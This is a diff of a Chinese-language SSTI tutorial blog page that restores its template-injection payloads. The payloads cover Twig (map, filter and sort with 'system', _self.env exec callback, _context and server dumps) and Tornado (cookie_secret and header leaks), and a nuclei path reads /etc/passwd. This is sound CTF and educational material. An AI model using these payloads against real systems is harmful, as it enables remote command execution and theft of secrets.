@@ -11004,7 +11004,7 @@ http://127.0.0.1:8080/example/HelloWorld!%&amp;#123;#req=#context.get(&#39;co&#3
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;http:                            # 3. 请求与匹配逻辑块 (以前的版本叫 requests)&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;  - method: GET                  # 请求方法: GET, POST, PUT, DELETE 等&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;    path:&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;line&#34;&gt;&lt;span&gt;      - &#34;&amp;#x3C;!--swig￼19--&gt;/etc/passwd&#34; # 请求路径，&amp;#x3C;!--swig￼20--&gt; 是内置变量，代表目标地址&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;      - &#34;&amp;#123;&amp;#123;BaseURL&amp;#125;&amp;#125;/etc/passwd&#34; # 请求路径，&amp;#123;&amp;#123;BaseURL&amp;#125;&amp;#125; 是内置变量，代表目标地址&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;    matchers-condition: and      # 匹配器条件: and (必须全部满足), or (满足其一即可)&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;    &lt;/span&gt;&lt;/span&gt;
@@ -11147,7 +11147,7 @@ http://127.0.0.1:8080/example/HelloWorld!%&amp;#123;#req=#context.get(&#39;co&#3
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;h2 id=&#34;map&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#map&#34;&gt;#&lt;/a&gt; map&lt;/h2&gt;
 &lt;p&gt;其中一种payload是这样：&lt;/p&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼6--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123; [&#34;cat /flag&#34;] | map(&#34;system&#34;) | join(&#34;,&#34;) &amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/3.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;[&amp;quot;cat /etc/passwd&amp;quot;]&lt;/code&gt;：在Twig中创建了一个数组，里面只有一个Linux系统命令的元素&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;| map(&amp;quot;system&amp;quot;)&lt;/code&gt;：&lt;code&gt;|&lt;/code&gt;是管道符，将前面的数组传给后面的过滤器，&lt;code&gt;map()&lt;/code&gt;是Twig的数组处理过滤器，它的作用是对数组里面的每一个元素执行一个操作，将system当作参数传给map()，就相当于执行了&lt;code&gt;system(cat /flag)&lt;/code&gt;，之后&lt;code&gt;map()&lt;/code&gt;会将函数的返回值重新打包为新的数组&lt;/p&gt;
@@ -11165,46 +11165,46 @@ http://127.0.0.1:8080/example/HelloWorld!%&amp;#123;#req=#context.get(&#39;co&#3
 &lt;p&gt;了解了map过滤器，接下来我们试试其他的过滤器：&lt;/p&gt;
 &lt;h2 id=&#34;filter&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#filter&#34;&gt;#&lt;/a&gt; filter&lt;/h2&gt;
 &lt;p&gt;filter过滤器与map的作用区别不大，payload为：&lt;/p&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼10--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123; [&#34;cat /flag&#34;] | filter(&#34;system&#34;) | join(&#34;,&#34;) &amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/5.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;filter(&amp;quot;system&amp;quot;)&lt;/code&gt;会将前面数组里的命令交给system执行，由于非空字符串在php里面都被视为true，于是filter会认为这个元素“符合条件”，然后将其保留在数组中，最后join转换为字符串之后，回显的就是&lt;code&gt;cat /flag&lt;/code&gt;这个数组元素&lt;/p&gt;
 &lt;h2 id=&#34;sort&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sort&#34;&gt;#&lt;/a&gt; sort&lt;/h2&gt;
 &lt;p&gt;这个过滤器的正常用途是用于对数组进行自定义排序。它底层调用的是PHP的&lt;code&gt;usort()&lt;/code&gt;函数，需要比较两个元素的大小，他的payload为：&lt;/p&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼12--&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123; [&#34;cat /flag&#34;, 0] | sort(&#34;system&#34;) | join(&#34;,&#34;) &amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;或者&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼13--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123; [&#34;cat /flag&#34;, &#34;&#34;] | sort(&#34;system&#34;) | join(&#34;,&#34;) &amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/6.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/7.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;往数组中塞入两个元素，就会启动引擎的比较机制，将数组中的元素一起取出之后放进system函数里面，相当于执行了&lt;code&gt;system(&amp;quot;cat /flag&amp;quot;, 0)&lt;/code&gt;，而system函数的第二个参数在php中是&lt;code&gt;&amp;amp;$return_var&lt;/code&gt;（用于接收状态码），我们传入的第二个元素充当了或被忽略了这个占位符，从而成功执行命令，不过在&lt;code&gt;php 8.x&lt;/code&gt;版本中，像&lt;code&gt;system($cmd, &amp;amp;$return_var)&lt;/code&gt;或&lt;code&gt;exec&lt;/code&gt;、&lt;code&gt;passthru&lt;/code&gt;这样的函数，它们的第二个参数是&lt;strong&gt;强制按引用传递 (Pass by Reference)&lt;/strong&gt; 的。如果&lt;code&gt;sort&lt;/code&gt;过滤器传递给它的是一个字面量（比如上面的 &lt;code&gt;0&lt;/code&gt; 或&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;），PHP 8 会直接抛出致命错误，导致利用失败。所以在高版本中我们通常使用map和filter这两个过滤器&lt;/p&gt;
 &lt;h2 id=&#34;_self&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#_self&#34;&gt;#&lt;/a&gt; _self&lt;/h2&gt;
 &lt;p&gt;在早期的 Twig 版本中，引擎内部有一个全局变量叫&lt;code&gt;_self&lt;/code&gt;。在当时，&lt;code&gt;_self&lt;/code&gt;指向的是当前的模板对象 。由于它是一个对象，我们就可以通过&lt;code&gt;_self.env&lt;/code&gt;直接获取到Twig的运行环境 ，不过在Twig2.0之后&lt;code&gt;_self&lt;/code&gt;就受到了限制，甚至在3.0版本之后，&lt;code&gt;_self&lt;/code&gt;就只是一个普通的字符串，不具有&lt;code&gt;env&lt;/code&gt;属性或者宏，于是就会看到错误&lt;/p&gt;
 &lt;p&gt;如果版本允许的话，我们可以利用如下payload：&lt;/p&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼16--&gt;&amp;#x3C;!--swig￼17--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123;_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)&amp;#125;&amp;#125;&amp;#123;&amp;#123;_self.env.getFilter(&#34;id&#34;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;命令id被执行之后就会返回当前用户的id&lt;/p&gt;
 &lt;h2 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h2&gt;
 &lt;p&gt;当然，SSTI还有一种基础的利用方式就是用来泄露源码和程序环境中的上下文信息，在&lt;code&gt;Twig&lt;/code&gt;引擎中，我们可以通过下面方法获得一些关于当前应用的信息&lt;/p&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼18--&gt; #指向当前应用&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼19--&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼20--&gt;&lt;/span&gt;&lt;/span&gt;
-&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼21--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123;_self&amp;#125;&amp;#125; #指向当前应用&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123;_self.env&amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123;dump(app)&amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123;app.request.server.all|join(&#39;,&#39;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;其中dump()是Twig中的调试函数，可以把当前环境中的变量、对象甚至是底层的类信息全部打印出来，相当于&lt;code&gt;var_dump()&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/8.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;如果dump报错不可用，盲打手段通常是去读取Twig默认的全局环境变量：&lt;code&gt;_context&lt;/code&gt;，&lt;code&gt;_context&lt;/code&gt;是一个包含了当前模版所有可用变量的数组，虽然我们不能用&lt;code&gt;dump&lt;/code&gt;把它打印出来，但我们可以结合刚才学过的过滤器，把它里面的键名提取出来：&lt;/p&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼23--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123; _context | keys | join(&#34;,&#34;) &amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;code&gt;_context&lt;/code&gt;：拿到当前环境的所有环境变量（数组）&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;| keys&lt;/code&gt;：Twig的内置过滤器，用于提取数组中所有的“键名”&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/9.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;看到了site_config这个变量，我们就可以像访问数组一样去读取里面的内容&lt;/p&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/10.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;或者在不知道键名的情况下，我们还可以直接输出所有键名：&lt;/p&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼26--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123; site_config | keys | join(&#34; | &#34;) &amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/12.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;所有值：&lt;/p&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼28--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123; site_config | join(&#34; | &#34;) &amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/11.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;通过这种方式我们就能从中窃取敏感信息&lt;/p&gt;
 &lt;p&gt;最后是这一串：&lt;/p&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼30--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123;app.request.server.all|join(&#39;,&#39;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;Twig最初是为了Symfony这个庞大且著名的PHP框架而开发的。当开发者使用Symfony框架搭建网站时，Symfony会自动向Twig引擎里注入一个名为&lt;code&gt;app&lt;/code&gt;的全局变量。&lt;/p&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;app.request：包含用户的所有请求信息（GET、POST 参数、Headers）&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;app.request.server.all：这就相当于PHP里的$_SERVER全局数组，里面有服务器信息&lt;/span&gt;&lt;/span&gt;
@@ -11610,65 +11610,101 @@ http://127.0.0.1:8080/example/HelloWorld!%&amp;#123;#req=#context.get(&#39;co&#3
 &lt;span class=&#34;line&#34;&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;    tornado&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;ioloop&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;IOLoop&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;current&lt;/span&gt;&lt;span style=&#34;color:#2993a3;--shiki-dark:#5eaab5&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#2993a3;--shiki-dark:#5eaab5&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#999999;--shiki-dark:#666666&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#393A34;--shiki-dark:#DBD7CAEE&#34;&gt;start&lt;/span&gt;&lt;span style=&#34;color:#2993a3;--shiki-dark:#5eaab5&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#2993a3;--shiki-dark:#5eaab5&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;python3 tor.py&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;h2 id=&#34;基本探测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本探测&#34;&gt;#&lt;/a&gt; 基本探测&lt;/h2&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼71--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123;7*7&amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/48.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;窃取全局配置字典&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#窃取全局配置字典&#34;&gt;#&lt;/a&gt; 窃取全局配置字典&lt;/h2&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼73--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123; handler.settings &amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/49.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;只显示secret：&lt;/p&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼75--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123; handler.settings.get(&#39;cookie_secret&#39;) &amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/50.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;查看所有传入的http头-cookie-参数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看所有传入的http头-cookie-参数&#34;&gt;#&lt;/a&gt; 查看所有传入的HTTP头、Cookie、参数&lt;/h2&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼77--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123; handler.request &amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/51.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
-&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#x3C;!--swig￼79--&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;&amp;#123;&amp;#123; handler.request.headers &amp;#125;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;/2026/04/11/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/52.png&#34; class=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h2 id=&#34;利用-swig81-导入模块-swig82-执行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用-swig81-导入模块-swig82-执行&#34;&gt;#&lt;/a&gt; 利用{%%}导入模块，{{}}执行&lt;/h2&gt;
 &lt;h3 id=&#34;os&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#os&#34;&gt;#&lt;/a&gt; os&lt;/h3&gt;
